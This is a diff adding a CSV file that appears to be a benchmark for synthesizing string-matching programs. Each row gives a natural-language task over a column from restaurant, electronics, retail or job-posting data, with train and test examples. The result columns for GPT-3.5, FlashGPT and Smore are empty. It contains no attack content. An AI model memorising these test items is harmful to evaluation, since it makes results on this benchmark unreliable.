@@ -1,0 +1,1153 @@
+bid,database,table,column,task,train-positive,train-negative,test-positive,test-negative,GPT-3.5-exec-precision,GPT-3.5-exec-recall,GPT-3-exec-precision,GPT-3-exec-recall,FlashGPT-precision,FlashGPT-recall,FlashGPT-program,FlashGPT-time,FlashGPT-#ex,GPT-3.5-regex-precision,GPT-3.5-regex-recall,GPT-3.5-regex-program,GPT-3.5-regex-time,GPT-3.5-regex-#sample,GPT-3.5-synth-precision,GPT-3.5-synth-recall,GPT-3.5-synth-time,GPT-3.5-synth-program,GPT-3.5-synth-#sample,GPT-3-synth-precision,GPT-3-synth-recall,GPT-3-synth-time,GPT-3-synth-program,Smore-precision,Smore-recall,Smore-program,Smore-time,Smore-no-type-precision,Smore-no-type-recall,Smore-no-type-program,Smore-no-type-time,Smore-no-type-system-precision,Smore-no-type-system-recall,Smore-no-type-system-program,Smore-no-type-system-time,Smore-no-decomp-precision,Smore-no-decomp-recall,Smore-no-decomp-program,Smore-no-decomp-time,Smore-no-repair-precision,Smore-no-repair-recall,Smore-no-repair-program,Smore-no-repair-time,Smore-no-repair-#sample,Smore-no-sketch-precision,Smore-no-sketch-recall,Smore-no-sketch-program,Smore-no-sketch-time
+1,sf-restaurants,business,Owner City,name and abbreviation for cities in California,"Daly City
+San Francisco
+S.F.","DEERFIELD
+Seattle
+Day City","Yountville
+South Pasadena
+SAN CARLOS
+Vacaville
+Mill Valley
+Dublin
+Burlingame
+Hercules
+Sf.
+Redlands","Ponte Vedra Beach
+        WINTER PARK
+Honolulu
+El Sobrante
+94117
+Tiburon
+San Frfancisco
+ALPHARETTA
+        DANVILLE
+SANF FRANCISCO",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+2,sf-restaurants,business,Owner City,City name with at least one captial letter,"Wyomissing
+Boca Raton
+Milbrae","deerfield
+94608
+san francisco","Barringtron
+Vallejo
+Ripon
+Woonsocket
+Honolulu
+Chicago
+MALIBU
+Lodi
+DEERFIELD
+CHARLOTTE","Filbert St.
+San Francisc0o
+irvine
+SAN FRANICSCO
+PO Box 901, Deerfield
+PURCHASE
+hayward
+Diamond St.
+Brunswich St
+dublin",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+3,sf-restaurants,business,Owner Name,name in the form of [Company name] / [Owner name],"Indigo Pie, LLC / Michael Whang
+1234 Polk St., Inc. / Ibrahim M. Al Haj
+Andersen America, Inc. / Nobumitsu Kobayashi and Tad Saito","100 Brannan LLC
+AAA Vegi, Inc
+ALEX MIRETSKY","12 Tribes Kosher Foods, Inc. / Rebecca Joseph
+Crepe & Brioche, Inc. / Catherine Bunand
+Gaucho's Table, LLC / Ruben Gamundi
+Pacific Retail VFC 1, Inc. / Michael J. Pollastro, CEO
+La Mediterranee I, Inc. / Levon Der Bedrossian, Vanick Der Bedrossian
+YMCA of San Francisco / Kari Lee, Exec. Director
+The Park SF, LLC / David Stanton, Anna Weinberg
+Joe's Union L.P. / Patricia Herman, John Duggan, Elena Duggan
+Fresco Pizza and Grill, Inc. / Belarbi Abdelghani
+John's Grill Inc. / John Konstin","NIDAL S. NAZZAL & YUSEF NAZZAL
+SAFEWAY CORP., PETER MCGOWAN
+Red Lantern SF LLC
+License To Spill, Inc
+790 Bush St. Ventures, Inc.  Roger Abuyaghi
+Kawthar, Inc
+TWENTY-SIX SHOTS, INC
+Sunrise Irving Market Inc
+The Dry Dock Corp   Peter O'Leary
+JASER S. YACOUB & RAMI S. JASE",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+4,sf-restaurants,business,Name,stores name with id,"24 HOUR FITNESS, INC. #547
+7 Eleven #2366-24139C
+BURGER KING 4525","1601 Bar & Kitchen
+24 Hour Fitness, Inc
+AT&T - DOGGIE DINER room 3228 [145164]","Subway #27657
+7-Eleven Store 2231-33429A
+Walgreens #3185
+Subway Sandwiches #27662
+Big Joe's Broiller #2
+AFC Sushi @ Safeway #985
+Baysubway 02
+SERRANO'S PIZZA II
+LA LOMA PRODUCE #7
+SEE'S CANDIES, Inc. #34","WILDLIFE CONNECTION ESPRESSO CART
+AT&T - DOGGIE DINER room 3228 [145164]
+Beso Bistronomia
+Friendship Market
+AT&T - (CART 2)  DELI [145090]
+AT&T - CABLE CAR BAR (VIEW) [146519]
+T P SEAFOOD & MEAT CO. INC.
+MEALS ON WHEELS OF SF, INC.
+AT&T - DERBY GRILL room 2103 [145171]
+Benjarong Thai Cuisine",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+5,sf-restaurants,business,Name,Market with street name ,"17TH & COLE MARKET
+2227 Irving Seafood Market
+Clement Street Farmers Market","A B C MARKET
+Mr. & Mrs. Tea House LLC
+Corner Bakery Cafe #1584","The Market On Market
+Presidio Foodmart
+Bernal Heights Market
+Clement Mini Market
+California & Lyon Market
+Fort Mason Market and Deli
+Green & Polk Produce
+23rd & Guerrero Market & Deli
+50 Fremont Farmers Market
+22ND & IRVING MARKET","The Secret Wine Shop
+Ana's Market
+HEALTHY SPIRITS
+PARAGON RESTAURANT & BAR
+MEZES RESTAURANT
+LUCCA FOOD & WINE SHOP
+Martha & Bros. Coffee Co
+A&M LIQUOR
+Vegiland Market, Inc.
+Kingdom of Dumpling",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+6,sf-restaurants,business,Name,Restaurant that are named after a person,"Sally Restaurant and Deli
+ANDERSEN BAKERY
+Alice Chinese Bistro","NORDSTROM CAFE BISTRO
+ALMA'S CIGARETTES
+Alice Chalmers Club House (CACFP)","JJardine Catering & Events
+Ho's Bootleg Tavern
+PASITA'S BAKERY
+KITARO JAPANESE RESTAURANT
+JIM'S RESTAURANT
+Annie's Hot Dogs
+Anthony's Cookies
+ADELITA'S CAKES
+Akiko's Sushi Bar
+David's Deli & Bistro","NEW ERITREA RESTAURANT
+MARINA SUPER
+LUCCA FOOD & WINE SHOP
+Legend Billiard Hall
+Mr. & Mrs. Tea House LLC
+Corner Bakery Cafe #1584
+Glaze Donuts
+Club Kristi
+Aguila De Oro
+AT&T Park - Food Cart P2",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+7,sf-restaurants,business,Day of Application Date,Restaurant that are created before 2000 or after 2010,"1999-12-28 00:00:00
+2010-01-05 00:00:00
+2012-04-02 00:00:00","2000-02-15 00:00:00
+2003-10-01 00:00:00
+2005-07-22 00:00:00","2016-05-25 00:00:00
+2016-04-07 00:00:00
+1999-05-19 00:00:00
+2013-02-04 00:00:00
+2014-06-04 00:00:00
+2014-10-07 00:00:00
+2015-05-20 00:00:00
+2014-06-16 00:00:00
+1995-01-05 00:00:00
+1997-12-02 00:00:00","2006-07-14 00:00:00
+2002-08-05 00:00:00
+2009-05-26 00:00:00
+2005-03-15 00:00:00
+2000-04-26 00:00:00
+2003-11-03 00:00:00
+2008-01-03 00:00:00
+2007-06-22 00:00:00
+2004-07-29 00:00:00
+2005-05-12 00:00:00",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+8,plugs-electronics,hands_on_lab_data,Product Name,All intel computer that has more than 8 GB memory,"264-27"" iMac® with Retina 5K display   Intel Core i5 (3.2GHz)   8GB Memory
+436-Star Wars Special Edition 15.6"" Laptop   Intel Core i7   8GB Memory
+268-ENVY Desktop   Intel Core i7   16GB Memory","285-Slimline Desktop   Intel Pentium   4GB Memory
+283-Desktop   AMD A10 Series
+112-iPhone 6s Plus 64GB   Gold (AT&T)","274-IdeaCentre 300s Desktop   Intel Core i5   8GB Memory
+281-Pavilion Desktop   Intel Core i3   8GB Memory
+286-Envy Desktop   Intel Core i5   8GB Memory
+266-Pavillion Desktop   Intel Core i7   8GB Memory","958-Galaxy S6 edge+ 4G LTE with 32GB Memory Cell Phone   Black Sapphire (Verizon Wireless)
+262-ENVY 27Touch Screen All In
+270-Pavilion 23Touch Screen All In
+438-11.6"" Chromebook 2   Intel Celeron   2GB Memory
+435-MacBook®   12"" Display   Intel Core M
+401-MacBook Air® (Latest Model)   13.3"" Display   Intel Core i5
+427-G50 15.6"" Laptop   Intel Core i3   4GB Memory
+419-Yoga 2 2 in 1 11.6Touch
+409-MacBook®   12"" Display   Intel Core M
+414-Inspiron 13.3Touch Screen Laptop   Intel Core i5",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+9,plugs-electronics,hands_on_lab_data,Product Name,All At&T or Verizon phone that has more than 32 GB memory,"101-Galaxy Note5 4G LTE with 32GB Memory Cell Phone   Black Sapphire (AT&T)
+969-iPhone 6s Plus 128GB   Gold (Verizon Wireless)
+150-Galaxy S6 4G with 64GB Memory Cell Phone   White Pearl (AT&T)","141-iPhone 6 Plus 16GB   Space Gray (AT&T)
+114-Gear S Smartwatch 40mm Chrome AT&T   Black Urethane
+923-iPhone 6 16GB   Silver (Verizon Wireless)","944-iPhone 6s 64GB   Gold (Verizon Wireless)
+921-iPhone 6s Plus 64GB   Space Gray (Verizon Wireless)
+140-Galaxy S6 edge 4G with 32GB Memory Cell Phone   Black Sapphire (AT&T)
+150-Galaxy S6 4G with 64GB Memory Cell Phone   White Pearl (AT&T)
+103-iPhone 6s 64GB   Space Gray (AT&T)
+945-iPhone 6s 64GB   Silver (Verizon Wireless)
+980-Galaxy S6 edge 4G LTE with 64GB Memory Cell Phone   Black Sapphire (Verizon Wireless)
+973-iPhone 6s Plus 128GB   Space Gray (Verizon Wireless)
+936-iPhone 6s 64GB   Rose Gold (Verizon Wireless)
+955-V10 4G with 64GB Memory Cell Phone   Black (Verizon Wireless)","896-Galaxy S6 edge with 64GB Memory Cell Phone   White (Sprint)
+897-iPhone 6 Plus 64GB   Gold (Sprint)
+859-iPhone 6 64GB   Space Gray (Sprint)
+899-Desire 510 Cell Phone   Deep Navy Blue (Sprint)
+118-iPhone 6s 16GB   Gold (AT&T)
+883-Galaxy S6 4G LTE with 32GB Memory Cell Phone   Black (T Mobile)
+857-iPhone 6s 16GB   Gold (Sprint)
+886-iPhone 6 Plus 16GB   Gold (Sprint)
+895-iPhone 6s Plus 128GB   Silver (Sprint)
+139-Gear S Smartwatch 40mm Chrome AT&T   White Urethane",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+10,plugs-electronics,hands_on_lab_data,Product Name,All camera with lens between 18-200mm,"799-D3300 DSLR Camera with 18-55 mm VR Lens
+785-EOS T6i DSLR Camera with EF S 18-55 mm STM Lens Video Creator Kit
+530-EOS 70D DSLR Camera with EF S 18-135mm STM Lens Video Creator Kit","500-EF 75–300 mm f/4–5.6 III Telephoto Zoom Lens
+505-EF 35 mm f/2 IS USM Wide Angle Lens
+552-AF S DX NIKKOR 18-300 mm f/3.5","780-D3300 DSLR Camera with 18-55 mm VR Lens
+536-EOS 5D Mark III DSLR Camera with 24-70 mm f/4L IS Lens
+800-D3200 DSLR Camera with 18-55 mm VR II and 55-200 mm VR II Lenses
+792-D5300 DSLR Camera with 18-55 mm VR Lens
+777-Bundle EOS Rebel T5i with EF S 18-55 mm IS STM Kit
+778-D3200 DSLR Camera with 18-55 mm VR Lens
+787-EOS Rebel T5i DSLR Camera with 18-135 mm IS STM Lens
+537-D5300 DSLR Camera with 18-55 mm VR Lens
+527-D7200 DSLR Camera with 18-140 mm Lens
+530-EOS 70D DSLR Camera with EF S 18 135mm STM Lens Video Creator Kit","679-PowerShot G7 X 20.2 Megapixel Digital Camera
+557-EF 17-40 mm f/4L USM Ultra Wide Zoom Lens
+659-Snap 10.0 Megapixel Digital Camera
+520-FE 28 mm f/2 E Mount Prime Lens
+555-AF S DX Micro NIKKOR 40 mm f/2.8G Macro Lens
+556-Sonnar T FE 55 mm f/1.8 ZA Lens for Most Sony a7 Series Cameras
+796-D5300 DSLR Camera (Body Only)
+499-EF S 24 mm f/2.8 STM Standard Lens for Canon APS C Cameras
+521-35 mm f/1.8 Prime Lens for Most NEX E Mount Cameras
+542-D5300 DSLR Camera (Body Only)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+11,plugs-electronics,hands_on_lab_data,Product Name,All TV that is > 42' and >= 2160P,"233-43"" Class (42.5"" Diag.)   LED   2160p
+842-49"" Class (48.5"" Diag.)   OLED   2160p
+10-60"" Class (60"" Diag.)   LED   2160p","451-48"" Class (47.6"" Diag.)   LED   1080p
+11-40"" Class (40"" Diag.)   LED   2160p
+230-50"" Class (49.5 Diag.)   LED   1080p","454-65"" Class (64.5"" Diag.)   LED   2160p
+1-60"" Class (59.5"" Diag.)   LED   2160p
+208-65"" Class (64.5"" Diag.)   LED Curved   2160p
+804-55"" Class (54.6"" Diag.)   LED   2160p
+834-65"" Class (64.5"" Diag.)   OLED   2160p
+9-55"" Class (54.6"" Diag.)   LED   2160p
+459-60"" Class (60"" Diag.)   LED   2160p
+47-55"" Class (54.6"" Diag.)   OLED   2160p
+841-75"" Class (74.5"" Diag.)   2160p   Smart
+828-65"" Class (64.5"" Diag.)   2160p   Smart","201-55"" Class (54.6"" Diag.)   OLED   Curved
+450-39"" Class (38.5"" Diag.)   LED   720p
+806-40"" Class (40"" Diag.)   LED   1080p
+232-E Series 32"" Class (32"" Diag.)   LED
+468-32"" Class (31.5"" Diag.)   LED   1080p
+460-48"" Class (47.6"" Diag.)   LED   1080p
+235-50"" Class (49.5"" Diag.)   LED   1080p
+472-24"" Class (23.8"" Diag.)   LED   1080p
+816-40"" Class (40"" Diag.)   LED   1080p
+632-21.5"" LED HD Monitor   Glossy Black",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+12,plugs-electronics,hands_on_lab_data,Product Name,All TV that is <50' or with <=1080P,"232-E Series 32"" Class (32"" Diag.)   LED 2160p
+4-50"" Class (49.5"" Diag.)   LED   2160p
+825-32"" Class (31.5"" Diag.)   LED   1080p","227-65"" Class (64.5"" Diag.)   LED   1080p
+2-65"" Class (64.5"" Diag.)   LED   2160p
+245-AQUOS   70"" Class (69.5"" Diag.)   LED","824-E Series   24"" Class (23"" Diag.)
+820-43"" Class (42.6"" Diag.)   LED   1080p
+220-48"" Class (47 5/8"" Diag.)   LED
+472-24"" Class (23.8"" Diag.)   LED   1080p
+223-50"" Class (49.7"" Diag.)   LED   2160p
+235-50"" Class (49.5"" Diag.)   LED   1080p
+233-43"" Class (42.5"" Diag.)   LED   2160p
+226-48"" Class (47.6"" Diag.)   LED   2160p
+476-24"" Class (23 5/8"" Diag.)   LED
+239-AQUOS   43"" Class (42.5"" Diag.)   LED","802-60"" Class (59.5"" Diag.)   LED   2160p
+215-88"" Class (88"" Diag.)   LED   Curved
+614-21.5IPS LED HD Monitor   Black
+817-55"" Class (54.6"" Diag.)   LED   2160p
+835-55"" Class (54.6"" Diag.)   LED   2160p
+217-55"" Class (54 5/8"" Diag.)   LED
+231-AQUOS   55"" Class (54.6"" Diag.)   LED
+475-60"" Class (59.5"" Diag.)   LED   2160p
+208-65"" Class (64.5"" Diag.)   LED Curved   2160p
+243-55"" Class (54.6"" Diag.)   LED   2160p",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+13,plugs-electronics,hands_on_lab_data,Date,Find purchase date that occurs in evening of May,"2019-05-01 18:00:28
+2020-05-04 23:43:05
+2020-05-24 00:39:21","2020-05-31 11:59:09
+2020-06-01 22:26:21
+2019-04-30 19:02:14","2022-05-25 20:02:42
+2021-05-26 19:55:27
+2019-05-16 18:56:00
+2021-05-08 22:20:06
+2020-05-31 23:47:43
+2021-05-20 00:29:23
+2022-05-19 23:26:56
+2019-05-28 00:55:11
+2021-05-31 20:12:46
+2020-05-09 00:37:22","2020-07-17 07:55:30
+2019-08-21 16:44:45
+2021-05-10 10:44:30
+2019-09-03 19:10:38
+2020-10-15 06:34:25
+2020-07-08 06:14:27
+2019-07-23 17:48:31
+2020-07-12 06:29:41
+2021-12-07 03:57:04
+2020-05-20 07:36:05
+2020-04-17 10:09:24",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+14,plugs-electronics,d_store,Monthly Rent Cost,Find rent >=10k,"10000
+10700
+11300","9400
+1400
+1600","10600
+10400
+11400
+11500
+11200
+10200
+11100
+10900
+11000
+10300","7600
+4000
+4600
+2000
+5000
+7000
+9000
+5100
+9700
+2000",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+15,retail,GA,Hits page pagetitle,string of the format string | string | string,"Google Products | Shop by Brand | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google
+Âm thanh | Điện tử | Cửa Hàng Google Merchandise
+Canecas & copos | Drinkware | Loja de Mercadoria do Google","Подарочные карты | Магазин Google Merchandise
+14: Electronics | Google Merchandise Store
+Bags | Google Merchandise Store","Accesorios | Electrónica | Google tienda de artículos
+YouTube | Магазин по бренду | Google Магазин продукції
+Adhesivas | Accesorios | Google tienda de artículos
+Audio | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/
+Аудио | Электроника | Google Магазин продукции
+Svítilny | Electronics | Merchandise obchod Google
+Головные Уборы | Одежда Товаров Магазин | Google
+Android | Comprar por marca | Google Merchandise Store
+Headgear | Apparel | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Headgear
+Männer T-Shirts | Bekleidung | Google Merchandise Store","Google Flashlight - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Accessories/Google+Flashlight.axd
+Google Women's Short Sleeve Performance Tee Black - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s+Google+Short+Sleeve+Performance+Tee+Black.axd
+The Google Merchandise Store/Compact Selfie Stick
+Oficina | Google Merchandise Store
+Dárkové karty | Merchandise Store Google
+女裝| Google商品商店
+服裝| Google商品商店
+The Google Merchandise Store/Blue Metallic Textured Spiral Notebook Set
+The Google Merchandise Store/Android 24 oz Contigo Addison
+The Google Merchandise Store/BRIGHTtravels Seat Pack Organizer - https://shop.googlemerchandisestore.com/Google+Redesign/Bags/Totes/BRIGHTtravels+Seat+Pack+Organzier.axd",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+16,retail,GA,Hits page pagetitle,string of the format string - url,"Google Kick Ball - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle/Fun/Google+Kick+Ball.axd
+Shop by Brand - https://shop.googlemerchandisestore.com/store.html?cid=42067&vid=20160512512&tpt=theme1_en&mpv=childItemsDTO&mpvp=6
+Nest-USA - https://shop.googlemerchandisestore.com/Google+Redesign/Nest/Nest-usa","Notebooks & Journals | Office | Google Merchandise Store https://shop.googlemerchandisestore.com/Google+Redesign/Office/Notebooks++Journals
+Youth | Kids' Apparel | Google Merchandise Store https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Kid+s/Kid+s+Youth
+https://shop.googlemerchandisestore.com/?ci=%7Bifdbm:%7Bcampaignid%7D%7D","Shop by Brand - https://shop.googlemerchandisestore.com/store.html?cid=42067&vid=20160512512&tpt=theme1_en&mpv=childItemsDTO&mpvp=4
+Google - https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google
+The Google Merchandise Store/Malibu Sunglasses - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle/Fun/Malibu+Sunglasses.axd
+Google Women's Short Sleeve Badge Tee Grey - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s/Women+s+T+Shirts/Google+Womens+Short+Sleeve+Badge+Tee.axd
+Lifestyle - https://shop.googlemerchandisestore.com/Google+Redesign/Lifestyle
+Google Women's Short Sleeve Performance Tee Black - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Women+s+Google+Short+Sleeve+Performance+Tee+Black.axd
+BRIGHTtravels Seat Pack Organizer - https://shop.googlemerchandisestore.com/Google+Redesign/Bags/Totes/BRIGHTtravels+Seat+Pack+Organzier.axd
+Google 2200mAh Micro Charger - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Google+Micro+Charger.axd
+Micro Wireless Earbud - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Audio/Micro+Wireless+Earbud.axd
+Google Flashlight - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Accessories/Google+Flashlight.axd","Water Bottles & Tumblers | Drinkwa
+YouTube | Shop by Brand | Google Merchandise Store -https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/YouTube
+Flashlights | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/electronics/flashlights
+Android | Shop by Brand | Google Merchandise
+Google | Shop by Brand | Google Merchandise Store |url:[https://shop.googlemerchandisestore.com/Google+Redesign/Shop+by+Brand/Google]
+Audio | Electronics | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Electronics/Audio
+Men's T-Shirts | Apparel | Google Merchandise Store - https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Men++s/Men++s+T+Shirts
+Google Men's Bike Short Sleeve Tee Charcoal |url:[https://shop.googlemerchandisestore.com/Google+Redesign/Apparel/Mens+Tshirts/Google+Mens+Bike+Short+Tee+Charcoal.axd]
+Home|https://shop.googlemerchandisestore.com/?utm_source=Partners&utm_medium=affiliate&utm_campaign=Data%20Share%20Promo
+7 Men's Performance Wear | Apparel | Google Merchandise Store",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+17,retail,STOCK,Description,product with certain measurement,"BAG 125 g SWIRLY MARBLES
+VINTAGE FOLDING RULER 2 M
+BLACK CHRISTMAS TREE 30 CM","VANILLA INCENSE 40 CONES IN TIN
+SEWING SUSAN 21 NEEDLE SET
+MAGNETS PACK OF 4 VINTAGE LABELS ","BLACK GEMSTONE NECKLACE 45 CM
+GREEN GOOSE FEATHER TREE 60 CM
+BLACK CHRISTMAS TREE 120 CM
+ESSENTIAL BALM 3.5 g TIN IN ENVELOPE
+BLACK CHRISTMAS TREE 60 CM
+POLYESTER FILLER PAD 40x40 cm
+DIAMOND LAS VEGAS NECKLACE 45 CM
+DUSTY PINK CHRISTMAS TREE 30 CM
+WHITE GOOSE FEATHER TREE 60 CM 
+ZINC FINISH 15 CM PLANTER POTS","PAPER LANTERN 7 POINT SNOW STAR
+BLUE POLKADOT PASSPORT COVER
+HAIRCLIPS FORTIES FABRIC ASSORTED
+VINTAGE KEEPSAKE BOX PARIS DAYS
+BLUE HARMONICA IN BOX 
+SET 20 NAPKINS FAIRY CAKES DESIGN 
+WOODEN TREE CHRISTMAS SCANDINAVIAN
+PAPER LANTERN 9 POINT HOLLY STAR L
+BLUE SPOT CERAMIC DRAWER KNOB
+LUNCH BAG DOILEY PATTERN ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+18,retail,STOCK,Description,product of set at least 6,"SET OF 6 KASHMIR FOLKART BAUBLES
+SET 12 TAPER CANDLES
+SET 20 NAPKINS FAIRY CAKES DESIGN ","SET OF 2 ROUND TINS DUTCH CHEESE
+SET 4 GARDEN ROSE DINNER CANDLE
+ZINC TOP  2 DOOR WOODEN SHELF","SET 36 COLOUR PENCILS LOVE LONDON
+ORANGE SCENTED SET 9 T-LIGHTS
+SET OF 12 T-LIGHTS VINTAGE DOILEY
+SET 6 BLACK BIRD T-LIGHT CANDLES
+SET OF 6 NATIVITY MAGNETS 
+SET 12 TAPER CANDLES
+SET OF 36 PAISLEY FLOWER DOILIES
+SET OF 6 SNACK LOAF BAKING CASES
+SET OF 72 GREEN PAPER DOILIES
+SET 12 COLOUR PENCILS LOVE LONDON
+SET 20 RED RETROSPOT PAPER NAPKINS ","60 TEATIME FAIRY CAKE CASES
+PAPER CHAIN KIT VINTAGE CHRISTMAS
+NOVELTY BISCUITS CAKE STAND 3 TIER
+PACK 20 ENGLISH ROSE PAPER NAPKINS
+SET OF 4 KNICK KNACK TINS LEAF
+PACK OF 12 50'S CHRISTMAS TISSUES
+PINK VINTAGE PAISLEY PICNIC BAG
+GROW YOUR OWN HERBS SET OF 3
+SET OF 3 GOLD FLYING DUCKS
+SET 3 OCEAN SCENT CANDLE JEWEL BOX
+RED RETROSPOT ROUND CAKE TINS
+PARTY PIZZA DISH RED RETROSPOT",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+19,retail,STOCK,Description,product with colors,"GREEN/BLUE FLOWER DESIGN BIG MUG
+FELTCRAFT HAIRBAND PINK/PURPLE
+BLUE AND PINK ROSE PATCH PURSE","SET/6 FROG PRINCE T-LIGHT CANDLES
+PLAYING CARDS JUBILEE UNION JACK
+EASTER DECORATION HANGING BUNNY","RED/CREAM STRIPE CUSHION COVER 
+WHITE/RED FOLDING UMBRELLA POLKADOT
+RED/WHITE FOLDING UMBRELLA POLKADOT
+PINK AND WHITE CHRISTMAS TREE 120CM
+3 TIER CAKE TIN GREEN AND CREAM
+CREAM AND PINK FLOWERS PONY 
+PINK/PURPLE RETRO RADIO
+PINK/YELLOW FLOWERS HANDBAG
+WHITE AND BLUE CERAMIC OIL BURNER
+BLACK/WHITE NECKLACE W TASSEL","TRAVEL CARD WALLET UNION JACK
+SET/4 BUTTERFLY MIRROR MAGNETS
+MAGIC DRAWING SLATE DOLLY GIRL 
+60 TEATIME FAIRY CAKE CASES
+STORAGE TIN VINTAGE LEAF
+GIFT BAG PSYCHEDELIC APPLES
+SET OF 6 TEA TIME BAKING CASES
+6 RIBBONS ELEGANT CHRISTMAS 
+HANGING WOOD AND FELT FLOWER
+SET 3 RETROSPOT TEA,COFFEE,SUGAR",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+20,retail,STOCK,Description,start with color and end with jewlery name,"PINK SWEETHEART BRACELET
+WHITE FRANGIPANI NECKLACE
+PINK VINTAGE VICTORIAN EARRINGS","VINTAGE ENAMEL & CRYSTAL EARRINGS
+WHITE STITCHED WALL CLOCK
+TABLECLOTH RED APPLES DESIGN ","WHITE GLASS CHUNKY CHARM BRACELET
+RED KUKUI COCONUT SEED NECKLACE
+RED ENAMEL FLOWER RING
+PINK BOUDICCA LARGE BRACELET
+BLACK ENAMEL FLOWER RING
+BLACK DIAMANTE EXPANDABLE RING
+PURPLE SWEETHEART BRACELET
+MIDNIGHT BLUE DROP CRYSTAL NECKLACE
+TURQ+RED BOUDICCA LARGE BRACELET
+BLACK VINTAGE  CRYSTAL EARRINGS","WRAP PINK FAIRY CAKES 
+FOOD CONTAINER SET 3 LOVE HEART 
+5 STRAND GLASS NECKLACE CRYSTAL
+SET/3 RED GINGHAM ROSE STORAGE BOX
+BLUE PAISLEY NOTEBOOK
+SINGLE ANTIQUE ROSE HOOK IVORY
+PORCELAIN ROSE LARGE 
+BATHROOM SET LOVE HEART DESIGN
+PACK 6 HEART/ICE-CREAM PATCHES
+BLUE STONES ON WIRE FOR CANDLE",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+21,marketing,MARKETING_CAMPAIGN_ACTIVITY,Title,Software engineer with salary > 100k,"*RUBY ON RAILS Developer w/ CLOUD exp. to 140K
+Dynamics AX / DAX / AXAPTA Developer $120k
+*SR. Software Enginner w/ AWS/Cloud exp. 100% REMOTE to 200K or 125hr","$95k (DOE)
+C#.Net Developer 55K to 80K (Perm Hire)
+Data Scientist $250","MS Business Intelligence Developer 115k
+Lead Backend Software Engineer $200k
+Senior Java Engineer $135k
+Front End UI Architect / Engineer $195k
+Senior Android Developer $140k
+MS BI Analyst/Developer | Dunwoody, Georgia | 105K
+Javascript Developer for a Cutting Edge Company to $110K
+Lead Software Applications Developer $100K
+SIS Developer/Architect $130k
+Lead DevOps Engineer $150k","Magento Software Developer: 110
+Linux Engineer (Build, Deploy, Release, AWS)
+BlackLine Cloud Platform Consultant
+Senior Python/C++ Game Engineer (Relocation)
+Android Developer ( Remote Work)
+SENIOR .NET DEVELOPER
+Microsoft .Net and Azure Developer
+Sr. Java Developer (2 positions)
+Java Automation API Test Engineer in Palo Alto, CA
+Web Developer (NetSuite)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+22,marketing,MARKETING_CAMPAIGN_ACTIVITY,Title,Software engineer that have specified working locations,".NET Developer reqd at Edina MN
+Axiom Developer Needed in Boston, MA
+Sr. Java Programmers in Richmond, VA","SAP MDG Consultant in Dublin, OH
+Senior Windows Administrator/Easton, PA  5 mth+ contract (VR)
+ Sr. Systems Administrator Needed ASAP in Vinings Area!!!",".NET Developer (Web API/ SQL/ JavaScript) in Winter Park, FL
+Sr. Java Programmers in Richmond, VA
+Lead Python Developer in Newton MA
+MS BI Analyst/Developer at Dunwoody, Georgia
+Sr. Oracle Application Developer in Dublin, OH
+HP Exstream Lead Developer in Bloomington, IL
+SharePoint Developer in Pittsburgh, PA
+PHP Developer in IRVING
+Senior Android Developer in Newport Beach, CA
+Sr. Software Engineer in ATL","Full Stack Developer | Unlimited Paid Vacation
+Senior Scientific Software Developer
+Sitecore Lead Onsite role
+SFDC or JAVA Software Engineer/Developer
+Senior Technology Support Analyst
+Java Spring Integration Developer
+python / node.js developer
+Need: DataStage Information Analyzer Consultant_ West Norriton, PA
+Sr. Application Performance Engineer (1099 or W2 only)
+Network Engineer (Junior) (Contract to Hire)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
